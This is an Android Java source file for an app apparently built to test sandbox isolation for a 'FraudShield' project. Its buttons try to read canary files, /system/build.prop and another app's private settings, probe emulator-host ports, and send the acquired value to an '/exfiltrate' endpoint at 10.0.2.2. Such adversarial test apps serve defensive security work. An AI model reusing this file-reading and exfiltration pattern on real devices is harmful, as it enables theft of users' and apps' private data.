package com.fraudshield.adversary;

import android.app.Activity;
import android.os.Bundle;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.ScrollView;
import android.graphics.Color;
import android.view.View;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    private String lastAcquiredCanary = "NONE";
    private TextView statusText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        ScrollView scroll = new ScrollView(this);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(20, 20, 20, 20);
        
        statusText = new TextView(this);
        statusText.setText("Status: Ready\nCanary: NONE");
        statusText.setTextColor(Color.BLACK);
        layout.addView(statusText);

        addButton(layout, "Read Own Storage", new Runnable() { public void run() { readCanary(getFilesDir() + "/own_canary.txt"); } });
        addButton(layout, "Read Shared Canary", new Runnable() { public void run() { readCanary("/sdcard/CANARY_SHARED.txt"); } });
        addButton(layout, "Read Temp Canary", new Runnable() { public void run() { readCanary("/data/local/tmp/CANARY_ADB.txt"); } });
        addButton(layout, "Read System", new Runnable() { public void run() { readCanary("/system/build.prop"); } });
        addButton(layout, "Read Other App", new Runnable() { public void run() { readCanary("/data/data/com.android.settings/shared_prefs/settings.xml"); } });
        
        addButton(layout, "Probe Host", new Runnable() { public void run() { probeNetwork("http://10.0.2.2:5432"); } });
        addButton(layout, "Probe Backend", new Runnable() { public void run() { probeNetwork("http://10.0.2.2:8000"); } });
        
        addButton(layout, "Exfiltrate Canary", new Runnable() { public void run() {
            probeNetwork("http://10.0.2.2:9999/exfiltrate?data=" + lastAcquiredCanary);
        } });
        
        scroll.addView(layout);
        setContentView(scroll);
        
        try {
            java.io.FileOutputStream fos = openFileOutput("own_canary.txt", MODE_PRIVATE);
            fos.write("FRAUDSHIELD_CANARY_OWN".getBytes());
            fos.close();
        } catch (Exception e) {}
    }

    private void addButton(LinearLayout layout, String text, final Runnable action) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            action.run();
                        } catch (Exception e) {
                            updateStatus("Action Failed: " + e.getMessage());
                        }
                    }
                }).start();
            }
        });
        layout.addView(btn);
    }

    private void readCanary(String path) {
        try {
            FileInputStream fis = new FileInputStream(path);
            BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line);
            }
            reader.close();
            fis.close();
            
            String result = sb.toString();
            if (result.contains("FRAUDSHIELD_CANARY")) {
                lastAcquiredCanary = result;
            } else {
                lastAcquiredCanary = "READ_BUT_NOT_CANARY";
            }
            updateStatus("READ SUCCESS: " + path + "\nAcquired: " + lastAcquiredCanary);
        } catch (Exception e) {
            updateStatus("READ FAILED: " + path + " - " + e.getMessage());
        }
    }

    private void probeNetwork(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(2000);
            conn.setReadTimeout(2000);
            int code = conn.getResponseCode();
            updateStatus("PROBE SUCCESS: " + urlStr + " Code: " + code);
        } catch (Exception e) {
            updateStatus("PROBE FAILED: " + urlStr + " - " + e.getMessage());
        }
    }

    private void updateStatus(final String msg) {
        runOnUiThread(new Runnable() {
            public void run() {
                statusText.setText(msg);
            }
        });
    }
}
